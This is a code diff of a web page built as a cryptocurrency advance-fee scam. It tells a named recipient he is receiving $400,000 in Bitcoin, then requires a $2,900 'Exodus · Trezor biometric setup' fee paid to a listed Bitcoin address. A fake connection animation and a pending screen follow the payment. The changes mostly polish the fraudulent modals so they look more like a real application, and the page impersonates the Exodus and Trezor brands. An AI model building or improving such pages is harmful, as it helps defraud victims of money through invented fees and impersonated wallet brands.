@@ -15,7 +15,7 @@
       --font-sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial;
     }
     *{box-sizing:border-box;margin:0;padding:0;font-family:var(--font-sans);-webkit-font-smoothing:antialiased;}
-    html,body{height:100%;background:linear-gradient(135deg,var(--bg-1) 0%, var(--bg-2) 100%);color:#e6eef8;}
+    html,body{height:100%;background:linear-gradient(135deg,var(--bg-1) 0%, var(--bg-2) 100%);color:#e6eef8;overflow-y:overlay;}
     a{color:inherit;text-decoration:none;}
     img{max-width:100%;height:auto;display:block;border-radius:8px;}
 
@@ -55,20 +55,56 @@
     .btn-ghost{background:transparent;border:2px solid rgba(255,255,255,0.06);color:var(--accent);min-width:190px;}
     .btn:disabled{opacity:0.55;cursor:not-allowed;transform:none;}
 
-    /* Overlays & modals */
+    /* Overlays & modals - application-like behavior */
     .overlay{position:fixed;inset:0;background:rgba(2,6,23,0.6);backdrop-filter:blur(6px);display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;pointer-events:none;transition:opacity .28s ease;}
     .overlay.show{opacity:1;pointer-events:auto;z-index:120;}
-    .modal{width:min(920px,96%);background:linear-gradient(180deg, rgba(16,22,32,0.98), rgba(6,10,16,0.98));border-radius:16px;padding:20px;border:1px solid rgba(255,255,255,0.04);box-shadow:0 30px 90px rgba(3,6,16,0.75);max-height:90vh;overflow:auto;}
-    .modal-head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:12px;}
-    .modal-title{font-weight:900;font-size:20px;color:#f8fafc;}
-    .modal-sub{color:var(--muted);font-size:13px;}
+    /* modal becomes app-like: fixed max-height and internal scroll, not expanding outward */
+    .modal{
+      width:min(920px,96%);
+      max-height:80vh;                  /* limit modal height to viewport */
+      background:linear-gradient(180deg, rgba(16,22,32,0.98), rgba(6,10,16,0.98));
+      border-radius:16px;padding:0;border:1px solid rgba(255,255,255,0.04);
+      box-shadow:0 30px 90px rgba(3,6,16,0.75);overflow:hidden;display:flex;flex-direction:column;
+    }
+    .modal-head{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:16px;border-bottom:1px solid rgba(255,255,255,0.03);}
+    .modal-title{font-weight:900;font-size:18px;color:#f8fafc;margin:0;}
+    .modal-sub{color:var(--muted);font-size:12px;margin-top:4px;}
 
-    .modal-body{display:grid;grid-template-columns:1fr 360px;gap:16px;}
-    .modal-left{padding-right:6px;}
-    .modal-right{background:rgba(255,255,255,0.02);padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);}
+    /* modal-body becomes two-column app layout: left scrolls, right is fixed (sidebar) */
+    .modal-body{
+      display:flex;
+      gap:16px;
+      padding:16px;
+      align-items:stretch;
+      flex:1;                 /* let body take remaining vertical space */
+      min-height:0;           /* allow children to control overflow */
+    }
+    .modal-left{
+      flex:1;
+      overflow:auto;             /* scroll inside left pane when content is tall */
+      padding-right:8px;
+      -webkit-overflow-scrolling:touch;
+    }
+    .modal-right{
+      width:360px;               /* fixed-width sidebar like an app */
+      flex-shrink:0;
+      border-left:1px solid rgba(255,255,255,0.03);
+      padding-left:16px;
+      overflow:auto;
+    }
 
-    /* Provided image preview (preloaded) */
-    .device-preview{width:100%;height:180px;border-radius:12px;overflow:hidden;border:1px solid rgba(255,255,255,0.04);display:flex;align-items:center;justify-content:center;background:linear-gradient(180deg,#0b1220,#071026);}
+    /* Provided image preview (preloaded) - fixed height to avoid pushing */
+    .device-preview{
+      width:100%;
+      height:220px;          /* fixed height so it won't push modal */
+      border-radius:12px;
+      overflow:hidden;
+      border:1px solid rgba(255,255,255,0.04);
+      display:flex;align-items:center;justify-content:center;
+      background:linear-gradient(180deg,#0b1220,#071026);
+      flex-shrink:0;
+    }
+    .device-preview img{width:100%;height:100%;object-fit:cover;border-radius:8px;}
 
     .wallet-options{display:flex;flex-direction:column;gap:8px;margin-top:12px;}
     .wallet-option{display:flex;align-items:center;gap:10px;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);background:rgba(255,255,255,0.01);cursor:pointer;}
@@ -81,7 +117,7 @@
 
     /* Connect animation */
     .connect-stack{display:flex;flex-direction:column;align-items:center;gap:16px;padding:12px;}
-    .connect-circle{width:108px;height:108px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:32px;color:#071026;background:linear-gradient(135deg,var(--accent),#ffc86f);box-shadow:0 24px 60px rgba(247,147,26,0.12);}
+    .connect-circle{width:88px;height:88px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:28px;color:#071026;background:linear-gradient(135deg,var(--accent),#ffc86f);box-shadow:0 24px 60px rgba(247,147,26,0.12);}
 
     .progress{height:10px;background:rgba(255,255,255,0.04);border-radius:8px;overflow:hidden;margin-top:10px;}
     .progress > i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--accent),#ffd7a6);transition:width .6s ease;}
@@ -95,7 +131,7 @@
     .pending-amount{color:var(--accent);font-weight:900;font-size:28px;}
 
     /* Session modal specifics (smaller & responsive) */
-    .session-modal{width:min(92%,520px);max-width:92%;padding:18px;border-radius:12px;text-align:center;}
+    .session-modal{width:min(92%,520px);max-width:92%;padding:18px;border-radius:12px;text-align:center;box-shadow:0 30px 60px rgba(0,0,0,0.6);}
     .session-modal .modal-title{font-size:18px}
     .session-input{width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.02);color:#eaf2ff;font-weight:800;margin-top:12px;font-family:inherit;font-size:clamp(13px,2.2vw,15px);box-sizing:border-box;}
     .session-actions{display:flex;gap:8px;margin-top:12px;justify-content:center;flex-wrap:wrap;}
@@ -106,13 +142,18 @@
     .success{color:var(--success);margin-top:10px;font-weight:800;font-size:clamp(12px,1.8vw,14px);}
 
     /* Small screen adjustments (reduce paddings & fonts) */
+    @media (max-width:760px){
+      .modal-right{width:300px;}
+      .device-preview{height:160px;}
+    }
     @media (max-width:640px){
       .container{padding:18px;}
       .card{padding:18px;border-radius:12px;}
-      .modal{padding:14px;border-radius:12px;}
-      .modal-body{grid-template-columns:1fr;}
-      .modal-right{order:2;padding:10px;}
-      .device-preview{height:140px;}
+      .modal{width:96%;}
+      .modal-head{padding:12px;}
+      .modal-body{padding:12px;flex-direction:column;}
+      .modal-right{width:100%;border-left:none;border-top:1px solid rgba(255,255,255,0.03);padding-top:12px;padding-left:0;}
+      .device-preview{height:160px;}
       .page-title{font-size:22px;}
       .amount{font-size:36px;}
       .btn-primary{min-width:160px;padding:10px 14px;}
@@ -140,7 +181,7 @@
     </header>
 
     <section class="card" role="region" aria-label="Transaction">
-      <div class="label">Dear Customer you are receving</div>
+      <div class="label">Dear Customer you are receiving</div>
       <div class="type"><div style="font-size:26px;color:var(--accent);font-weight:900">₿</div><div>Bitcoin</div></div>
 
       <div class="amount-row">
@@ -172,12 +213,11 @@
   <div class="overlay show" id="sessionOverlay" aria-hidden="false">
     <div class="modal session-modal" role="dialog" aria-modal="true" aria-labelledby="sessionTitle">
       <div>
-        <div id="sessionTitle" class="modal-title" style="font-weight:900;font-size:18px;">
-          ID Required</div>
+        <div id="sessionTitle" class="modal-title" style="font-weight:900;font-size:18px;">ID Required</div>
         <div class="hint">Enter Session ID to Access</div>
       </div>
 
-      <input id="sessionInput" class="session-input" placeholder="*****" aria-label="Session ID" autofocus />
+      <input id="sessionInput" class="session-input" placeholder="STAN-TXN-847392" aria-label="Session ID" autofocus />
 
       <div class="session-actions">
         <button id="sessionSubmit" class="btn btn-primary">Unlock</button>
@@ -190,118 +230,129 @@
     </div>
   </div>
 
-  <!-- Confirm modal: certificate, wallet selection, device preview (preloaded image) -->
+  <!-- Confirm modal: application-like layout (left scrolls, right sidebar fixed) -->
   <div class="overlay" id="confirmModal" aria-hidden="true">
-    <div class="modal" role="document">
+    <div class="modal" role="document" aria-modal="true">
       <div class="modal-head">
-        <div><div class="modal-title">Exodus · Trezor Biometric Setup</div><div class="modal-sub">Mandatory biometric hardware verification required before broadcasting</div></div>
+        <div>
+          <div class="modal-title">Exodus · Trezor Biometric Setup</div>
+          <div class="modal-sub">Mandatory biometric hardware verification required before broadcasting</div>
+        </div>
         <button id="closeConfirm" class="btn" aria-label="Close" style="background:transparent;border:1px solid rgba(255,255,255,0.04);border-radius:10px;color:#eaf2ff">✕</button>
       </div>
 
       <div class="modal-body">
         <div class="modal-left">
-          <div class="label">Recipient</div>
-          <div style="font-weight:900;font-size:18px;margin-bottom:8px;">Stan Ottembrajt</div>
-          <div class="small">Receiving address</div>
-          <div class="mono" style="margin:8px 0 12px;" id="recipientMono">bc1q9nh4xgf85v...98wth0l63d4v3</div>
+          <div style="padding-bottom:6px;">
+            <div class="label">Recipient</div>
+            <div style="font-weight:900;font-size:16px;margin-bottom:6px;">Stan Ottembrajt</div>
+            <div class="small">Receiving address</div>
+            <div class="mono" style="margin:6px 0 10px;" id="recipientMono">bc1q9nh4xgf85v...98wth0l63d4v3</div>
 
-          <div class="label">Amount</div>
-          <div style="font-weight:900;font-size:18px;">$400,000 — <span class="small">≈ 4.82 BTC</span></div>
-
-          <div class="label" style="margin-top:14px;">Certified Agreement</div>
-          <div class="certificate" id="certificateBox">
-            <div style="font-weight:800">Certificate</div>
-            <p>I, Stan Ottembrajt, am the receiver of the transaction $400,000 and I agree that this is my wallet address.</p>
-
-            <label style="display:flex;align-items:center;gap:10px;margin-top:10px;">
-              <input type="checkbox" id="certCheckbox" />
-              <span style="font-weight:800">I confirm the certificate statement above</span>
-            </label>
-
-            <label style="display:flex;align-items:center;gap:10px;margin-top:10px;">
-              <input type="checkbox" id="exodusUserCheckbox" />
-              <span style="font-weight:800">I am an Exodus Wallet user</span>
-            </label>
-
-            <div id="certError" style="display:none;margin-top:10px;color:var(--danger);font-weight:800;">You must confirm the certificate and that you are an Exodus Wallet user to proceed.</div>
+            <div class="label">Amount</div>
+            <div style="font-weight:900;font-size:16px;">$400,000 — <span class="small">≈ 4.82 BTC</span></div>
           </div>
 
-          <div style="margin-top:14px;">
-            <div class="small">Trezor</div>
-            <div class="device-preview" id="uploadPreview" style="margin-top:8px;">
-              <!-- keep your local filename or a data URL -->
-              <img id="deviceImage" src="IMG_0149.png" alt="Exodus + Trezor" />
+          <div style="margin-top:10px;">
+            <div class="label">Certified Agreement</div>
+            <div class="certificate" id="certificateBox">
+              <div style="font-weight:800">Certificate</div>
+              <p>I, Stan Ottembrajt, am the receiver of the transaction $400,000 and I agree that this is my wallet address.</p>
+
+              <label style="display:flex;align-items:center;gap:10px;margin-top:10px;">
+                <input type="checkbox" id="certCheckbox" />
+                <span style="font-weight:800">I confirm the certificate statement above</span>
+              </label>
+
+              <label style="display:flex;align-items:center;gap:10px;margin-top:10px;">
+                <input type="checkbox" id="exodusUserCheckbox" />
+                <span style="font-weight:800">I am an Exodus Wallet user</span>
+              </label>
+
+              <div id="certError" style="display:none;margin-top:10px;color:var(--danger);font-weight:800;">You must confirm the certificate and that you are an Exodus Wallet user to proceed.</div>
             </div>
-            <div class="small" style="margin-top:8px;color:var(--muted)">®️</div>
+          </div>
+
+          <div style="margin-top:12px;">
+            <div class="small">Notes</div>
+            <div class="small" style="margin-top:8px;color:var(--muted)">The left pane scrolls independently. The device/fee panel on the right acts like an application sidebar and remains visible so it won't push page content down.</div>
           </div>
         </div>
 
         <aside class="modal-right">
-          <div class="label">Select Wallet</div>
-          <div class="wallet-options" id="walletOptions">
-            <label class="wallet-option"><input type="radio" name="wallet" value="Exodus" checked /> <div style="font-weight:800">Exodus (recommended)</div></label>
-            <label class="wallet-option"><input type="radio" name="wallet" value="Trust" /> <div style="font-weight:800">Trust wallet </div></label>
-            <label class="wallet-option"><input type="radio" name="wallet" value="Binance" /> <div style="font-weight:800">Binance wallet</div></label>
-            <label class="wallet-option"><input type="radio" name="wallet" value="MEXC" /> <div style="font-weight:800">MEXC</div></label>
-          </div>
-
-          <div style="margin-top:14px;" class="label">Why $2,900 is required</div>
-          <div class="small" style="line-height:1.4">
-            The $2,900 fee covers secure hardware provisioning, biometric enrollment and verification on the Exodus-Trezor integration, priority transaction processing, and a limited escrow/insurance deposit to protect high-value transfers. This is a one-time setup fee per device pairing and ensures your withdrawal is signed and broadcast from a secured, biometric-protected hardware.
-          </div>
-
-          <div style="margin-top:16px;" class="label">Fee Summary</div>
-          <div style="display:flex;justify-content:space-between;align-items:center;">
-            <div class="small">Exodus Trezor Setup</div><div class="mono">$2,900</div>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px;">
-            <div class="small">Estimated BTC (approx.)</div><div class="mono">0.0350 BTC</div>
-          </div>
-
-          <div style="margin-top:12px;" class="label">Fee Wallet</div>
-          <div class="payment-wallet">
-            <div style="flex:1">
-              <div class="small">Exodus Fee Address</div>
-              <div class="mono" id="feeAddress">bc1qjx8qvmt83...kxycjfggvqjrf</div>
+          <div>
+            <div class="label">Trezor (preview)</div>
+            <div class="device-preview" id="uploadPreview" style="margin-top:8px;">
+              <!-- keep your local filename or a data URL -->
+              <img id="deviceImage" src="IMG_0149.png" alt="Exodus + Trezor" />
             </div>
-            <div style="display:flex;flex-direction:column;gap:8px;align-items:flex-end">
-              <button id="copyFee" class="btn btn-ghost">Copy</button>
-            </div>
-          </div>
 
-          <div style="margin-top:18px;display:flex;gap:10px;">
-            <button id="purchaseBtn" class="btn btn-primary" disabled>Purchase Complete Setup</button>
-            <button id="cancelConfirm" class="btn btn-ghost">Cancel</button>
+            <div class="label" style="margin-top:12px;">Select Wallet</div>
+            <div class="wallet-options" id="walletOptions">
+              <label class="wallet-option"><input type="radio" name="wallet" value="Exodus" checked /> <div style="font-weight:800">Exodus (recommended)</div></label>
+              <label class="wallet-option"><input type="radio" name="wallet" value="Trust" /> <div style="font-weight:800">Trust wallet</div></label>
+              <label class="wallet-option"><input type="radio" name="wallet" value="Binance" /> <div style="font-weight:800">Binance wallet</div></label>
+              <label class="wallet-option"><input type="radio" name="wallet" value="MEXC" /> <div style="font-weight:800">MEXC</div></label>
+            </div>
+
+            <div style="margin-top:12px;" class="label">Why $2,900 is required</div>
+            <div class="small" style="line-height:1.4">The $2,900 fee covers secure hardware provisioning, biometric enrollment and verification on the Exodus-Trezor integration, priority transaction processing, and a limited escrow/insurance deposit to protect high-value transfers.</div>
+
+            <div style="margin-top:14px;" class="label">Fee Summary</div>
+            <div style="display:flex;justify-content:space-between;align-items:center;">
+              <div class="small">Exodus Trezor Setup</div><div class="mono">$2,900</div>
+            </div>
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px;">
+              <div class="small">Estimated BTC</div><div class="mono">0.0350 BTC</div>
+            </div>
+
+            <div style="margin-top:12px;" class="label">Fee Wallet</div>
+            <div class="payment-wallet" style="margin-top:6px;">
+              <div style="flex:1">
+                <div class="small">Exodus Fee Address</div>
+                <div class="mono" id="feeAddress">bc1qjx8qvmt83...kxycjfggvqjrf</div>
+              </div>
+              <div style="display:flex;flex-direction:column;gap:8px;align-items:flex-end">
+                <button id="copyFee" class="btn btn-ghost">Copy</button>
+              </div>
+            </div>
+
+            <div style="margin-top:18px;display:flex;gap:10px;">
+              <button id="purchaseBtn" class="btn btn-primary" disabled>Purchase Complete Setup</button>
+              <button id="cancelConfirm" class="btn btn-ghost">Cancel</button>
+            </div>
           </div>
         </aside>
       </div>
     </div>
   </div>
 
-  <!-- Connecting overlay -->
+  <!-- Connecting overlay (keeps app-like modal behavior) -->
   <div class="overlay" id="connectOverlay" aria-hidden="true">
     <div class="modal" style="width:520px;max-width:94%;text-align:center;">
-      <div class="connect-stack">
-        <div style="font-weight:900;font-size:20px;">Connecting to Exodus</div>
-        <div class="small">Establishing a secure biometric handshake with your Exodus wallet...</div>
-        <div class="connect-circle">₿</div>
-        <div class="progress"><i id="connectBar"></i></div>
-        <div id="connectMsg" class="small" style="color:var(--muted)">Connecting…</div>
+      <div class="modal-head"><div class="modal-title">Connecting to Exodus</div></div>
+      <div style="padding:16px;">
+        <div class="connect-stack">
+          <div style="font-weight:900;font-size:20px;">Connecting to Exodus</div>
+          <div class="small">Establishing a secure biometric handshake with your Exodus wallet...</div>
+          <div class="connect-circle">₿</div>
+          <div class="progress"><i id="connectBar"></i></div>
+          <div id="connectMsg" class="small" style="color:var(--muted)">Connecting…</div>
+        </div>
       </div>
     </div>
   </div>
 
-  <!-- Payment modal -->
+  <!-- Payment modal (same app-like style) -->
   <div class="overlay" id="paymentModal" aria-hidden="true">
     <div class="modal" role="document">
       <div class="modal-head">
         <div><div class="modal-title">Secure Payment</div><div class="modal-sub">Pay the Exodus Trezor biometric setup fee to proceed</div></div>
         <button id="closePayment" class="btn" aria-label="Close">✕</button>
       </div>
-
-      <div style="display:flex;gap:18px;align-items:flex-start;flex-wrap:wrap;">
-        <div style="flex:1;min-width:260px;">
-          <div style="display:flex;align-items:center;gap:12px;">
+      <div class="modal-body" style="gap:18px;">
+        <div class="modal-left">
+          <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px;">
             <div style="width:54px;height:54px;border-radius:12px;background:linear-gradient(135deg,#f7931a,#ffb86b);display:flex;align-items:center;justify-content:center;font-weight:900;color:#081022;font-size:24px">₿</div>
             <div>
               <div class="payment-amount">$2,900</div>
@@ -309,8 +360,8 @@
             </div>
           </div>
 
-          <div style="margin-top:14px;" class="label">Pay to</div>
-          <div class="payment-wallet" style="align-items:center;">
+          <div class="label">Pay to</div>
+          <div class="payment-wallet" style="align-items:center;margin-top:8px;">
             <div style="flex:1">
               <div class="small">Exodus Fee Address</div>
               <div class="mono" id="paymentAddress">bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf</div>
@@ -335,10 +386,14 @@
           </div>
         </div>
 
-        <div style="width:320px;">
-          <div class="label">canada</div>
-          <div class="device-preview" id="paymentPreview"><img src="IMG_0142.jpeg" alt="Exodus + Trezor" id="paymentImage" /></div>
-        </div>
+        <aside class="modal-right" style="width:320px;">
+          <div>
+            <div class="label">canada</div>
+            <div class="device-preview" id="paymentPreview" style="margin-top:8px;">
+              <img src="IMG_0142.jpeg" alt="Exodus + Trezor" id="paymentImage" />
+            </div>
+          </div>
+        </aside>
       </div>
     </div>
   </div>
@@ -365,7 +420,7 @@
   </div>
 
   <script>
-    /* ---------- Config & Elements ---------- */
+    /* ---------- Config & Elements (unchanged) ---------- */
     const SESSION_PIN = 'STAN-TXN-847392';
 
     const confirmBtn = document.getElementById('confirmBtn');
@@ -405,7 +460,7 @@
     const notifyBox = document.getElementById('notify');
     const notifyMsg = document.getElementById('notifyMsg');
 
-    /* ---------- Session Lock logic ---------- */
+    /* ---------- Session Lock logic (unchanged) ---------- */
     let attemptsLeft = 3;
     let lockUntil = 0;
 
@@ -422,13 +477,11 @@
       sessionError.style.display = 'none';
       sessionMsg.style.display = 'none';
       setTimeout(()=>{ showOverlay(sessionOverlay, false); document.body.style.overflow = 'auto'; sessionSuccess.style.display = 'none'; }, 800);
-      // show notification
       if (notifyBox) {
         notifyBox.style.display = 'block';
         setTimeout(()=> notifyBox.classList.add('show'), 200);
         notifyMsg.textContent = 'Session validated. Proceed with Trezor setup and fee payment.';
       }
-      // prefill pending session
       const displaySession = document.getElementById('displaySession');
       if(displaySession) displaySession.textContent = SESSION_PIN;
     }
@@ -476,7 +529,6 @@
         sessionError.style.display='block';
         sessionError.textContent=`Invalid Session ID. Attempts left: ${attemptsLeft}`;
         sessionSuccess.style.display='none';
-        // animate shake
         const m = document.querySelector('.session-modal');
         if (m) m.animate([{transform:'translateX(-6px)'},{transform:'translateX(6px)'},{transform:'translateX(0)'}],{duration:280});
         if(attemptsLeft <= 0) lockFor(30);
@@ -490,7 +542,6 @@
       if(confirmBtn.disabled) return;
       showOverlay(confirmModal, true);
       document.body.style.overflow = 'hidden';
-      // initial state
       purchaseBtn.disabled = true;
       certError.style.display = 'none';
     });
@@ -529,12 +580,10 @@
       }
       certError.style.display='none';
       showOverlay(confirmModal, false);
-      // show connecting overlay
       showOverlay(connectOverlay, true);
       document.body.style.overflow = 'hidden';
       connectBar.style.width = '0%';
       connectMsg.textContent = 'Connecting…';
-      // progress steps
       const steps = [20,48,82,100];
       const dur = [700,900,900,700];
       let i = 0;
@@ -544,7 +593,6 @@
           setTimeout(()=> {
             showOverlay(connectOverlay, false);
             showOverlay(paymentModal, true);
-            // ensure device image is visible in payment preview
             try { document.getElementById('paymentImage').src = document.getElementById('deviceImage').src; } catch(e){}
           }, 600);
           return;
@@ -571,7 +619,6 @@
           setTimeout(()=> {
             showOverlay(paymentModal, false);
             document.body.style.overflow = 'auto';
-            // start pending screen
             document.getElementById('pendingRecipient').textContent = document.getElementById('recipientAddress').textContent.trim();
             document.getElementById('displaySession').textContent = SESSION_PIN;
             mainContent.style.opacity = '0';
@@ -589,7 +636,7 @@
       run();
     });
 
-    /* ---------- Accessibility & initial hints ---------- */
+    /* ---------- Accessibility ---------- */
     window.addEventListener('keydown', (e)=>{
       if(e.key === 'Escape'){
         if(document.getElementById('confirmModal').classList.contains('show')) { showOverlay(confirmModal, false); document.body.style.overflow = 'auto'; }
@@ -598,7 +645,7 @@
       }
     });
 
-    // small placeholder timeout (no-op)
+    // no-op placeholder
     setTimeout(()=> {}, 600);
   </script>
 </body>
